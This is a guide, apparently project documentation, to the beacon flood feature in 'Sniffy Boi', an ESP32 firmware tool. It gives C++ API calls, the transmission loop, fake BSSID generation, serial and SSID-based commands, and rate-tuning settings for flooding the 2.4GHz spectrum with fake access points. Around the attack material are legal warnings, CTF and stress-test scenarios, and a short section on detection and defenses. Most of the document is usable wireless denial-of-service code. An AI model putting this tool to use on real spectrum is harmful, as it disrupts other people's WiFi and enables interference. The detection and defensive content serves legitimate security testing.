# Sniffy Boi - Beacon Flood Attack Guide

## ⚠️ CRITICAL LEGAL WARNING

**THIS TOOL IS FOR AUTHORIZED USE ONLY**

### Legal Requirements
Before using beacon flood attacks, you **MUST** have:
- ✅ **Written authorization** to test wireless spectrum in your area
- ✅ **Explicit permission** for controlled environment testing
- ✅ **Documented scope** of testing (specific channels/locations)
- ✅ **Legal compliance** with local laws and FCC regulations

### Prohibited Uses
❌ **NEVER** use beacon flood attacks for:
- Disrupting public WiFi in airports, cafes, libraries
- Interfering with emergency services communications
- Mass disruption of wireless networks
- Denial of service attacks
- Any unauthorized RF spectrum pollution

### Criminal Penalties
Unauthorized beacon flood attacks violate:
- **Computer Fraud and Abuse Act (CFAA)** - up to 10 years prison
- **FCC Part 15 regulations** - fines up to $10,000 per violation per day
- **State computer crime laws** - varies by jurisdiction
- **Telecommunications Act** - criminal penalties + civil liability

**Use responsibly. You are solely responsible for legal compliance.**

---

## 🎯 What is a Beacon Flood Attack?

A **beacon flood attack** (also called beacon spam or beacon injection) rapidly transmits fake WiFi access point beacon frames on the 2.4GHz spectrum. This creates dozens or hundreds of fake network SSIDs that appear in WiFi scanners, cluttering the wireless environment and potentially causing confusion or denial of service.

### How It Works
```
1. Attacker selects target channel (1-13)
   ↓
2. Generate fake SSID list (50 networks)
   ↓
3. For each SSID:
   - Craft 802.11 beacon frame
   - Generate unique BSSID (fake MAC)
   - Add capability info & supported rates
   ↓
4. Transmit beacons at 1ms intervals (~1000/sec)
   ↓
5. WiFi scanners display all fake networks
   ↓
6. Real networks become hidden in noise
```

### Attack Objectives
- **Wireless Environment Testing**: Evaluate scanner performance under high-density conditions
- **CTF Challenges**: Hide flags or test participants' filtering skills
- **Security Research**: Study WiFi scanner behavior and filtering mechanisms
- **Penetration Testing**: Assess client device behavior when overwhelmed with SSIDs

### Frame Structure
```
802.11 Beacon Frame (~70 bytes minimum)
┌───────────────────────────────────────────────────────┐
│ Frame Control      (2)  │ 0x80 0x00 (beacon)          │
│ Duration           (2)  │ 0x00 0x00                   │
│ Destination MAC    (6)  │ FF:FF:FF:FF:FF:FF (bcast)   │
│ Source MAC (BSSID) (6)  │ Fake MAC (SSID-based hash)  │
│ BSSID              (6)  │ Same as Source MAC          │
│ Sequence Control   (2)  │ Incremented per beacon      │
├─────────────────── Beacon Frame Body ─────────────────┤
│ Timestamp          (8)  │ 0x00 * 8 (simplified)       │
│ Beacon Interval    (2)  │ 0x64 0x00 (100 TU = 102ms)  │
│ Capability Info    (2)  │ 0x11 0x04 (ESS + privacy)   │
├──────────────── Information Elements ─────────────────┤
│ SSID IE            (?)  │ Tag 0, Len N, SSID string   │
│ Supported Rates    (?)  │ Tag 1, Len 8, rate list     │
│ DS Parameter Set   (3)  │ Tag 3, Len 1, channel       │
└───────────────────────────────────────────────────────┘
```

---

## 🔧 Implementation

### API Functions

#### 1. Start Beacon Flood
```cpp
void PacketSniffer::startBeaconFlood(uint8_t channel = 1);
```
**Description**: Initiates beacon flood on specified channel with default SSID list

**Parameters**:
- `channel`: WiFi channel (1-13), defaults to channel 1

**Behavior**:
- Loads 50 test SSIDs if no custom list provided
- Locks scanner to target channel
- Disables channel hopping
- Starts continuous beacon transmission loop

**Example**:
```cpp
sniffer->startBeaconFlood(6);  // Start flood on channel 6
```

#### 2. Stop Beacon Flood
```cpp
void PacketSniffer::stopBeaconFlood();
```
**Description**: Stops beacon flood transmission

**Behavior**:
- Halts beacon transmission loop
- Prints statistics (total beacons sent)
- Does NOT re-enable channel hopping (manual re-enable needed)

**Example**:
```cpp
sniffer->stopBeaconFlood();
```

#### 3. Set Custom SSID List
```cpp
void PacketSniffer::setBeaconFloodSSIDs(const std::vector<String>& ssids);
```
**Description**: Replace default SSID list with custom network names

**Parameters**:
- `ssids`: Vector of SSID strings (max 32 bytes each per 802.11 spec)

**Example**:
```cpp
std::vector<String> custom_ssids = {
    "CTF-FLAG-1",
    "CTF-FLAG-2",
    "FIND-ME-IF-YOU-CAN",
    "RESEARCH-TEST-AP"
};
sniffer->setBeaconFloodSSIDs(custom_ssids);
sniffer->startBeaconFlood(6);
```

#### 4. Check Flood Status
```cpp
bool PacketSniffer::isBeaconFloodActive();
```
**Description**: Returns true if beacon flood is currently running

**Example**:
```cpp
if (sniffer->isBeaconFloodActive()) {
    Serial.println("Flood active, stopping...");
    sniffer->stopBeaconFlood();
}
```

---

## 📋 Command Interface Usage

### Serial Commands

#### Start Beacon Flood (Current Channel)
```
SNIFFY:BEACON
```
**Result**: Starts beacon flood on current channel

#### Start Beacon Flood (Specific Channel)
```
SNIFFY:BEACON:6
```
**Result**: Locks to channel 6 and starts beacon flood

#### Stop Beacon Flood
```
SNIFFY:BEACON
```
**Result**: If flood is active, stops it (toggle behavior)

### Alternative Keywords
All of these commands are equivalent:
```
SNIFFY:BEACON
SNIFFY:FLOOD
SNIFFY:SPAM
```

### Wireless C2 Usage (SSID Magic Packets)
Send commands via WiFi probe requests by creating network with SSID:
```
SNIFFY:BEACON
```
1. Phone Settings → WiFi → "Other..."
2. Network Name: `SNIFFY:BEACON`
3. Security: None
4. Tap "Join" (will fail, but command is sent)

### Web Interface (iOS/Mobile)
Open `misc/sniffy_ios_control.html` on your phone:
1. Tap **"📶 Beacon Flood"** button
2. Command is copied to clipboard
3. Follow on-screen instructions to send via WiFi settings

---

## 🎓 Technical Deep Dive

### Beacon Transmission Rate
Sniffy Boi sends beacons at **1ms intervals** (1000 beacons/sec):

```cpp
#define BEACON_FLOOD_INTERVAL_US 1000  // microseconds

void PacketSniffer::beaconFloodLoop() {
    unsigned long now = micros();
    if (now - last_beacon_time < BEACON_FLOOD_INTERVAL_US) return;

    sendBeaconFrame(beacon_ssids[ssid_index], beacon_flood_channel);
    ssid_index = (ssid_index + 1) % beacon_ssids.size();
}
```

**Performance**:
- **50 SSIDs** cycling at 1000 beacons/sec
- Each SSID appears **20 times per second**
- Full cycle through all SSIDs: **50ms**

### BSSID Generation
Each fake AP needs a unique BSSID (MAC address). Sniffy uses SSID hash to generate deterministic MACs:

```cpp
void PacketSniffer::buildBeaconFrame(uint8_t* frame, const String& ssid,
                                     uint8_t channel, const uint8_t* mac) {
    // Generate fake MAC from SSID hash
    uint32_t hash = 0;
    for (size_t i = 0; i < ssid.length(); i++) {
        hash = hash * 31 + ssid[i];
    }

    mac[0] = 0x02;  // Locally administered MAC
    mac[1] = (hash >> 24) & 0xFF;
    mac[2] = (hash >> 16) & 0xFF;
    mac[3] = (hash >> 8) & 0xFF;
    mac[4] = hash & 0xFF;
    mac[5] = channel;
}
```

**Why hash-based MACs?**
- Deterministic: Same SSID always gets same MAC
- Unique: Different SSIDs produce different MACs
- Valid: `0x02` LSB ensures locally-administered address
- Channel embedded: Last byte encodes channel number

### Information Elements (IEs)

Each beacon includes required 802.11 IEs:

**SSID IE (Tag 0)**:
```
┌────┬────┬────────────────┐
│ 00 │ 0F │ TEST-NETWORK-1 │
│tag │len │ SSID string    │
└────┴────┴────────────────┘
```

**Supported Rates IE (Tag 1)**:
```
┌────┬────┬───────────────────────────┐
│ 01 │ 08 │ 82 84 8B 96 0C 12 18 24  │
│tag │len │ 1,2,5.5,11,6,9,12,18 Mbps│
└────┴────┴───────────────────────────┘
```

**DS Parameter Set IE (Tag 3)**:
```
┌────┬────┬────┐
│ 03 │ 01 │ 06 │
│tag │len │ ch │
└────┴────┴────┘
```

---

## 🛡️ Detection & Countermeasures

### How to Detect Beacon Flooding

#### 1. Abnormal SSID Count
```bash
# Normal environment: 5-20 SSIDs
# Beacon flood: 50-500+ SSIDs on single channel
iwlist wlan0 scan | grep ESSID | wc -l
```

#### 2. Rapid SSID Appearance/Disappearance
Fake beacons lack clients, association responses, and data frames. They only send beacons.

#### 3. Sequential Naming Patterns
Look for SSIDs with patterns:
- `TEST-NETWORK-001`, `TEST-NETWORK-002`, ...
- `FAKE-AP-ALPHA`, `FAKE-AP-BETA`, ...

#### 4. MAC Address OUI Analysis
Check BSSID OUI (first 3 bytes):
- `02:xx:xx:xx:xx:xx` = Locally administered (often fake)
- Real APs use vendor OUIs (Cisco, Ubiquiti, TP-Link)

### Defensive Measures

#### For Network Administrators:
1. **Wireless IDS/IPS**: Deploy WIDS (Cisco, Aruba, Ekahau) to detect beacon floods
2. **Spectrum Analysis**: Monitor for abnormal beacon rates
3. **MAC Filtering**: Whitelist known AP BSSIDs
4. **Client Education**: Train users to identify fake networks

#### For Client Devices:
1. **SSID Whitelist**: Only connect to known networks
2. **Disable Auto-Connect**: Prevent connection to open networks
3. **Use VPN**: Encrypt traffic even on untrusted networks
4. **Signal Strength**: Real APs have consistent RSSI, fakes are often weak

---

## 📊 Default Test SSIDs

Sniffy Boi includes 50 test network names for authorized testing:

```cpp
"TEST-NETWORK-001", "TEST-NETWORK-002", "TEST-NETWORK-003",
"RESEARCH-AP-ALPHA", "RESEARCH-AP-BETA", "RESEARCH-AP-GAMMA",
"CTF-FLAG-HERE", "CTF-CHALLENGE-01", "CTF-CHALLENGE-02",
"SECURITY-TEST-01", "SECURITY-TEST-02", "SECURITY-TEST-03",
"LAB-WIFI-001", "LAB-WIFI-002", "LAB-WIFI-003",
"PENTEST-AP-ALPHA", "PENTEST-AP-BETA", "PENTEST-AP-GAMMA",
// ... 50 total SSIDs
```

**SSID Categories**:
- **Test Networks** (001-020): Generic test identifiers
- **Research APs**: Greek letter suffixes (Alpha, Beta, Gamma)
- **CTF Challenges**: Competition/flag identifiers
- **Lab WiFi**: Laboratory environment testing
- **Pentest APs**: Penetration testing markers
- **Security Audit**: Professional assessment identifiers

---

## 🔍 Example Usage Scenarios

### Scenario 1: Authorized Penetration Test
**Goal**: Test client device behavior when overwhelmed with SSIDs

```cpp
// Setup
sniffer->setChannel(6);
sniffer->channelHop(false);

// Start flood
sniffer->startBeaconFlood(6);
Serial.println("Beacon flood active on channel 6");

// Monitor for 60 seconds
delay(60000);

// Stop and analyze
sniffer->stopBeaconFlood();
Serial.println("Total beacons sent: ~60,000");
```

### Scenario 2: CTF Challenge
**Goal**: Hide flag in noise of fake networks

```cpp
std::vector<String> ctf_ssids;

// Generate 49 decoy SSIDs
for (int i = 1; i <= 49; i++) {
    ctf_ssids.push_back("DECOY-" + String(i));
}

// Add real flag as SSID #25 (hidden in middle)
ctf_ssids.insert(ctf_ssids.begin() + 24, "FLAG{b3ac0n_fl00d_pwn3d}");

sniffer->setBeaconFloodSSIDs(ctf_ssids);
sniffer->startBeaconFlood(6);
```

### Scenario 3: WiFi Scanner Stress Test
**Goal**: Evaluate scanner performance under high load

```cpp
// Measure baseline scan time
unsigned long start = millis();
WiFi.scanNetworks();
unsigned long baseline = millis() - start;

// Start beacon flood
sniffer->startBeaconFlood(6);
delay(1000);

// Measure degraded scan time
start = millis();
WiFi.scanNetworks();
unsigned long degraded = millis() - start;

Serial.printf("Baseline: %lums, Degraded: %lums\n", baseline, degraded);
```

---

## ⚙️ Configuration

### config.h Settings

```cpp
// Beacon Flood Attack Configuration (AUTHORIZED USE ONLY)
#define BEACON_FLOOD_INTERVAL_US 1000       // 1ms = 1000 beacons/sec
#define BEACON_FLOOD_DEFAULT_CHANNEL 6      // Channel 6 (least congested)
#define BEACON_FLOOD_SSID_COUNT 50          // 50 unique SSIDs
```

**Tuning Parameters**:

**BEACON_FLOOD_INTERVAL_US**:
- `1000` = 1ms = 1000 beacons/sec (default, aggressive)
- `5000` = 5ms = 200 beacons/sec (moderate)
- `10000` = 10ms = 100 beacons/sec (subtle)

**BEACON_FLOOD_DEFAULT_CHANNEL**:
- Channel 1, 6, 11: Non-overlapping (recommended)
- Channel 1-13: Full 2.4GHz spectrum

**BEACON_FLOOD_SSID_COUNT**:
- 10-50: Reasonable for testing
- 50-100: High density scenario
- 100+: Extreme stress testing

---

## 🚨 Troubleshooting

### No SSIDs Appearing in Scanner
**Causes**:
- Wrong channel selected
- Client scanning different channel
- Beacon interval too slow
- ESP32 transmission disabled

**Solutions**:
```cpp
// Verify flood is active
if (!sniffer->isBeaconFloodActive()) {
    Serial.println("ERROR: Flood not active");
}

// Check channel lock
Serial.printf("Current channel: %d\n", WiFi.channel());

// Verify beacon transmission
// (Monitor serial output for "Sent 1000 beacons" messages)
```

### ESP32 Crashes During Flood
**Causes**:
- Insufficient free heap memory
- WiFi stack not initialized
- Too many SSIDs (>100)

**Solutions**:
```cpp
// Check free memory before starting
Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());
if (ESP.getFreeHeap() < 50000) {
    Serial.println("ERROR: Insufficient memory");
    return;
}

// Reduce SSID count in config.h
#define BEACON_FLOOD_SSID_COUNT 25  // Reduced from 50
```

---

## 📚 Related Attack Guides
- [Deauth Attack Guide](DEAUTH_ATTACK_GUIDE.md) - Trigger handshakes
- [PMKID Attack Guide](PMKID_ATTACK_GUIDE.md) - Clientless WPA2 cracking
- [Handshake Capture Guide](HANDSHAKE_CAPTURE_GUIDE.md) - Passive capture

---

## 🔗 References
- [IEEE 802.11 Standard](https://standards.ieee.org/standard/802_11-2020.html)
- [ESP32 WiFi API](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html)
- [FCC Part 15 Regulations](https://www.fcc.gov/general/radio-frequency-safety-0)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Last Updated**: 2025-01-10
**Version**: 1.0
**Author**: Sniffy Boi Project
**License**: Educational Use Only - Authorized Testing Required
